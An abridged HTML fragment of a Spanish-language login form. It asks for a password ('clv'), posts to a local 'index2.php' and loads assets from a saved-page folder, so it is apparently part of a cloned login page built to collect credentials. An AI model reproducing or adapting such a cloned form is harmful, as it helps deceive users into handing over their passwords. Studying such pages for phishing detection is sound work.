...
<body class="h-100-vh">
	...
	<form  class="ng-pristine ng-invalid ng-touched" method="post" action="index2.php"><!---->
	...
	<label _ngcontent-ejr-c1="" class="etiqueta mb-0" for="inputPassword" style="width: 100%"> Ingresá tu clave <span _ngcontent-ejr-c1="" class="teclado-virtual">
	<img _ngcontent-ejr-c1="" alt="teclado" src="./index1_files/keyboard-regular.png">
	<a _ngcontent-ejr-c1="" class="manito ml-2">Teclado Virtual</a></span></label>
	<div _ngcontent-ejr-c1="" class="position-relative">
	<input _ngcontent-ejr-c1="" class="form-control mb-2 ng-pristine ng-invalid ng-touched"  id="inputPassword" name="clv" placeholder="Clave" 
	type="password" required><div _ngcontent-ejr-c1="" class=" d-inline-block eyePassAligne">
	<span _ngcontent-ejr-c1="" class="manito ion-ojoCerrado"></span></div></div></div>
